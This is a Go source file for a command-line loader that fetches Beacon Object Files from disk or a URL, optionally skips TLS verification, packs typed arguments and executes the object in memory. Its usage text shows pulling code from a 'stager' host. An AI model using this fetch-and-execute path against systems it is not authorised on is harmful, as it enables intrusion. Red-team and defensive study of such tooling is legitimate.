package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"time"
	"unicode/utf16"

	"go-object-loader/internal/bof"
)

func main() {
	if err := run(os.Args[1:], os.Stdout); err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		os.Exit(1)
	}
}

func run(args []string, out io.Writer) error {
	fs := flag.NewFlagSet("gol", flag.ContinueOnError)
	fs.SetOutput(out)

	var simpleArgs stringList
	var bofArgs stringList
	entry := fs.String("entry", "go", "BOF entry function to execute")
	filePath := fs.String("file", "", "path to a COFF object file")
	remoteURL := fs.String("url", "", "HTTP/S URL for a COFF object file")
	insecureTLS := fs.Bool("insecure-skip-verify", false, "skip HTTPS certificate verification")
	verbose := fs.Bool("verbose", false, "print loader diagnostics")
	bofFormat := fs.String("bof-format", "", "advanced BOF argument format: z=string, Z=UTF-16 string, i=int32, s=int16, b=base64 bytes")
	fs.Var(&simpleArgs, "arg", "string BOF argument; repeat for multiple string arguments")
	fs.Var(&bofArgs, "bof-arg", "advanced BOF argument value; repeat once for each --bof-format character")

	if err := fs.Parse(args); err != nil {
		return err
	}

	if *filePath == "" && fs.NArg() > 0 {
		*filePath = fs.Arg(0)
	}

	object, source, err := loadObject(*filePath, *remoteURL, *insecureTLS)
	if err != nil {
		printUsage(fs, out)
		return err
	}

	packedArgs, err := packCLIArgs(simpleArgs, *bofFormat, bofArgs)
	if err != nil {
		return err
	}

	fmt.Fprintf(out, "[*] Loading object file: %s\n", source)
	fmt.Fprintf(out, "[+] Object file loaded [%d bytes]\n", len(object))

	if err := bof.ExecuteWithOptions(object, *entry, packedArgs, bof.Options{Verbose: *verbose}); err != nil {
		return fmt.Errorf("failed to execute object file: %w", err)
	}

	fmt.Fprintln(out, "\n[+] Object file successfully executed")
	return nil
}

func loadObject(filePath, remoteURL string, insecureTLS bool) ([]byte, string, error) {
	switch {
	case filePath != "" && remoteURL != "":
		return nil, "", errors.New("use either --file/path or --url")
	case remoteURL != "":
		object, err := fetchObject(remoteURL, insecureTLS)
		return object, remoteURL, err
	case filePath != "":
		object, err := os.ReadFile(filePath)
		return object, filePath, err
	default:
		return nil, "", errors.New("missing object file path or --url")
	}
}

func fetchObject(rawURL string, insecureTLS bool) ([]byte, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("invalid url: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("unsupported url scheme %q", parsed.Scheme)
	}

	client := newHTTPClient(parsed.Scheme, insecureTLS)

	return fetchObjectWithClient(rawURL, client)
}

func newHTTPClient(scheme string, insecureTLS bool) *http.Client {
	client := &http.Client{Timeout: 30 * time.Second}
	if scheme == "https" && insecureTLS {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // Explicit user-controlled flag.
		}
	}
	return client
}

func fetchObjectWithClient(rawURL string, client *http.Client) ([]byte, error) {
	resp, err := client.Get(rawURL)
	if err != nil {
		return nil, fmt.Errorf("fetch object: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode > 299 {
		return nil, fmt.Errorf("fetch object: unexpected status %s", resp.Status)
	}

	object, err := io.ReadAll(io.LimitReader(resp.Body, 128<<20))
	if err != nil {
		return nil, fmt.Errorf("read response body: %w", err)
	}
	if len(object) == 0 {
		return nil, errors.New("downloaded object is empty")
	}

	return object, nil
}

func printUsage(fs *flag.FlagSet, out io.Writer) {
	fmt.Fprintln(out, "Usage:")
	fmt.Fprintf(out, "  %s [object.x64.o]\n", fs.Name())
	fmt.Fprintf(out, "  %s --file object.x64.o --entry go\n", fs.Name())
	fmt.Fprintf(out, "  %s --url https://stager:8080/some-bof.o --insecure-skip-verify\n", fs.Name())
	fmt.Fprintf(out, "  %s --file object.x64.o --arg target-host --arg username\n", fs.Name())
	fmt.Fprintf(out, "  %s --file object.x64.o --bof-format zi --bof-arg target --bof-arg 10\n", fs.Name())
}

type stringList []string

func (s *stringList) String() string {
	return fmt.Sprint([]string(*s))
}

func (s *stringList) Set(value string) error {
	*s = append(*s, value)
	return nil
}

func packCLIArgs(simpleArgs []string, format string, typedArgs []string) ([]byte, error) {
	if len(simpleArgs) > 0 {
		if format != "" || len(typedArgs) > 0 {
			return nil, errors.New("use either --arg or --bof-format/--bof-arg, not both")
		}
		return packAutoArgs(simpleArgs), nil
	}
	return packBOFArgs(format, typedArgs)
}

func packAutoArgs(values []string) []byte {
	payload := make([]byte, 0)
	for _, value := range values {
		if n, ok := parseAutoInt32(value); ok {
			payload = binary.LittleEndian.AppendUint32(payload, uint32(n))
			continue
		}
		payload = appendLengthPrefixed(payload, append([]byte(value), 0))
	}

	packed := binary.LittleEndian.AppendUint32(nil, uint32(len(payload)))
	packed = append(packed, payload...)
	return packed
}

func parseAutoInt32(value string) (int32, bool) {
	n, err := strconv.ParseInt(value, 10, 32)
	if err != nil {
		return 0, false
	}
	return int32(n), true
}

func packBOFArgs(format string, values []string) ([]byte, error) {
	if format == "" {
		if len(values) > 0 {
			return nil, errors.New("--bof-arg requires --bof-format")
		}
		return nil, nil
	}

	specs := []rune(format)
	if len(specs) != len(values) {
		return nil, fmt.Errorf("--bof-format has %d entries but %d --bof-arg values were provided", len(specs), len(values))
	}

	payload := make([]byte, 0)
	for i, spec := range specs {
		value := values[i]
		switch spec {
		case 'z':
			payload = appendLengthPrefixed(payload, append([]byte(value), 0))
		case 'Z':
			payload = appendLengthPrefixed(payload, utf16LEWithNull(value))
		case 'i':
			n, err := strconv.ParseInt(value, 0, 32)
			if err != nil {
				return nil, fmt.Errorf("argument %d: parse int32: %w", i+1, err)
			}
			payload = binary.LittleEndian.AppendUint32(payload, uint32(int32(n)))
		case 's':
			n, err := strconv.ParseInt(value, 0, 16)
			if err != nil {
				return nil, fmt.Errorf("argument %d: parse int16: %w", i+1, err)
			}
			payload = binary.LittleEndian.AppendUint16(payload, uint16(int16(n)))
		case 'b':
			decoded, err := base64.StdEncoding.DecodeString(value)
			if err != nil {
				return nil, fmt.Errorf("argument %d: parse base64 bytes: %w", i+1, err)
			}
			payload = appendLengthPrefixed(payload, decoded)
		default:
			return nil, fmt.Errorf("argument %d: unsupported BOF format character %q", i+1, spec)
		}
	}

	packed := binary.LittleEndian.AppendUint32(nil, uint32(len(payload)))
	packed = append(packed, payload...)
	return packed, nil
}

func appendLengthPrefixed(dst, value []byte) []byte {
	dst = binary.LittleEndian.AppendUint32(dst, uint32(len(value)))
	return append(dst, value...)
}

func utf16LEWithNull(value string) []byte {
	encoded := utf16.Encode([]rune(value + "\x00"))
	out := make([]byte, 0, len(encoded)*2)
	for _, v := range encoded {
		out = binary.LittleEndian.AppendUint16(out, v)
	}
	return out
}
